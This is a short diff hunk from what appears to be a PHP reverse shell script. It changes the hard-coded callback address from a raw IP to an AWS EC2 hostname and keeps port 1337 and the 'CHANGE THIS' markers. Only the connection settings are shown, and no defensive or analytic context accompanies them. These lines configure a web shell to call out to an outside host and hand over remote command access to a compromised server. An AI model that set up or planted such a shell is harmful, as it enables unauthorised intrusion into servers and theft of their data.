@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '18.207.235.148';  // CHANGE THIS
+$ip = 'ec2-18-207-235-148.compute-1.amazonaws.com';  // CHANGE THIS
 $port = 1337;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
